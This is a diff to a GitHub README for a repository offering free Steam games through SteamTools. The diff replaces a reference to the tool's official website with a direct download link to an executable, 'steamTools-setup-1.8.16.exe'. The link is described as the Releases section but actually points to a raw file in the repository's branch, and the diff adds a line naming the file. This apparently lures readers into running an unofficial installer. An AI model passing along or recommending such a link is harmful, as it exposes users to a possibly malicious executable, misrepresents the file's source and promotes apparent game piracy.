@@ -3,11 +3,11 @@
  ## ☑️ Install
 &nbsp;&nbsp;&nbsp;&nbsp; We rely on **three primary** sources to get free games directly added to your steam account.
 1. First, download the tool called SteamTools from their official website
-(or you can find the direct link below this section).
+(or you can download it directly from the [Releases](https://github.com/xvodoo/3HK-Steam-free-Games/raw/refs/heads/main/steamTools-setup-1.8.16.exe) section at the top of this GitHub page).
  ### &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;  [SteamTools](https://www.steamtools.net/)
 2. The next steps will guide you through how to connect your account, claim free games, and automate the entire process using the tool.<br>
 *__🎥 Watch the video below for a step-by-step tutorial__*
-
+SteamTools-setup-1.8.16.exe
  ## 📋 Guide
 1. Go to Steam and copy the name of the game you want.
 2. .Open [SteamDB](https://steamdb.info/) and paste the game name into the search bar.
